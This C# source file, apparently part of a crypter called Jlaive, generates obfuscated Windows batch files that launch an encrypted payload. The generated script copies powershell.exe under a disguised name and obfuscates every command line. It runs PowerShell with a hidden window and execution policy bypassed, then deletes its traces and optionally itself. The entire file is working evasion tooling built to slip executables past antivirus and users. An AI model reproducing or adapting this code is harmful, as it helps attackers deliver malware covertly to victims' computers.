using System;
using System.Text;

namespace Jlaive
{
    public class FileGen
    {
        public static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, Random rng)
        {
            (string, string) command = StubGen.CreatePS(key, iv, mode, rng);
            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");

            (string, string) obfuscated = Obfuscator.GenCodeBat(@"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", rng, 4);
            output.AppendLine(obfuscated.Item1);
            output.AppendLine(obfuscated.Item2 + " \"%~dp0%~nx0.exe\" /y");

            output.AppendLine("cls");
            obfuscated = Obfuscator.GenCodeBat("cd %~dp0", rng, 4);
            output.AppendLine(obfuscated.Item1);
            output.AppendLine(obfuscated.Item2);

            string commandstart = $"-noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ";
            obfuscated = Obfuscator.GenCodeBat(commandstart, rng, 2);
            output.AppendLine(obfuscated.Item1);
            (string, string) obfuscated2 = Obfuscator.GenCodeBat(command.Item2, rng, 2);
            output.AppendLine(obfuscated2.Item1);
            output.AppendLine("\"%~nx0.exe\" " + obfuscated.Item2 + command.Item1 + obfuscated2.Item2);

            output.AppendLine("del \"%~dp0%~nx0.exe\"");
            if (selfdelete) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
            output.AppendLine("exit /b");
            return output.ToString();
        }
    }
}
